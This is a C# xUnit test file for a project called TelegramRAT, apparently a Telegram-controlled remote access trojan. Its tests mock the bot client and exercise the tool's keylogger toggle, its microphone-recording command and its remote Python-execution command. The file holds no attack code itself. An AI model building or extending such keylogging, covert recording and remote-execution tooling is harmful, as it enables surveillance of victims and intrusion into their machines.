using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;
using Moq;
using NAudio.Wave;
using Telegram.Bot;
using Telegram.Bot.Requests;
using Telegram.Bot.Requests.Abstractions;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using TelegramRAT;
using TelegramRAT.Commands;
using Xunit;

namespace TelegramRAT.Tests;

public class CommandRegistryTests
{
    private static Mock<ITelegramBotClient> CreateBotMock(List<string> sentMessages)
    {
        var botMock = new Mock<ITelegramBotClient>(MockBehavior.Strict);

        botMock
            .Setup(b => b.MakeRequest(It.IsAny<IRequest<Message>>(), It.IsAny<CancellationToken>()))
            .Returns<IRequest<Message>, CancellationToken>((request, _) =>
            {
                switch (request)
                {
                    case SendMessageRequest messageRequest:
                        sentMessages.Add(messageRequest.Text);
                        return Task.FromResult(new Message
                        {
                            MessageId = 1,
                            Chat = new Chat { Id = messageRequest.ChatId.Identifier ?? 0 }
                        });
                    case SendDocumentRequest:
                    case SendVoiceRequest:
                        return Task.FromResult(new Message { MessageId = 1 });
                    default:
                        return Task.FromResult(new Message { MessageId = 1 });
                }
            });

        botMock
            .Setup(b => b.MakeRequest(It.IsAny<IRequest<bool>>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(true);

        botMock
            .Setup(b => b.MakeRequest(It.IsAny<IRequest<File>>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(new File { FileId = "file", FilePath = "UserScript.py" });

        botMock
            .Setup(b => b.MakeRequest(It.IsAny<IRequest<Stream>>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(Stream.Null);

        return botMock;
    }

    private static BotCommandModel CreateModel(string command, string[]? args = null)
        => new()
        {
            Command = command,
            Args = args ?? Array.Empty<string>(),
            RawArgs = args == null ? string.Empty : string.Join(' ', args),
            Message = new Message
            {
                Chat = new Chat { Id = 123 },
                From = new User { Id = 321, FirstName = "tester" },
                MessageId = 7,
                Date = DateTime.UtcNow
            }
        };

    [Fact]
    public async Task KeylogCommand_WhenAlreadyActive_TogglesOffWithoutRequests()
    {
        var sentMessages = new List<string>();
        var botMock = CreateBotMock(sentMessages);
        Program.SetBotClient(botMock.Object);

        var commands = new List<BotCommand>();
        CommandRegistry.InitializeCommands(commands);
        var command = commands.Single(c => c.Command == "keylog");

        var keylogField = typeof(CommandRegistry).GetField("KeylogActive", BindingFlags.NonPublic | BindingFlags.Static);
        keylogField!.SetValue(null, true);

        var model = CreateModel("keylog");

        await command.Execute(model);

        Assert.False((bool)keylogField.GetValue(null)!);
        Assert.Empty(sentMessages);
        botMock.VerifyNoOtherCalls();
    }

    [Fact]
    public async Task AudioCommand_RespondsImmediatelyWhenUnableToRecord()
    {
        var sentMessages = new List<string>();
        var botMock = CreateBotMock(sentMessages);
        Program.SetBotClient(botMock.Object);

        var commands = new List<BotCommand>();
        CommandRegistry.InitializeCommands(commands);
        var command = commands.Single(c => c.Command == "audio");

        var model = CreateModel("audio", new[] { "invalid" });

        await command.Execute(model);

        Assert.Single(sentMessages);
        var expectedMessage = WaveInEvent.DeviceCount == 0
            ? "This machine has no audio input devices, the recording isn't possible."
            : "Argument must be a positive integer!";
        Assert.Equal(expectedMessage, sentMessages[0]);
    }

    [Fact]
    public async Task PythonCommand_WithNoArguments_PromptsForInput()
    {
        var sentMessages = new List<string>();
        var botMock = CreateBotMock(sentMessages);
        Program.SetBotClient(botMock.Object);

        var commands = new List<BotCommand>();
        CommandRegistry.InitializeCommands(commands);
        var command = commands.Single(c => c.Command == "py");

        var model = CreateModel("py");

        await command.Execute(model);

        Assert.Single(sentMessages);
        Assert.Equal("Need an expression or file to execute", sentMessages[0]);
    }
}
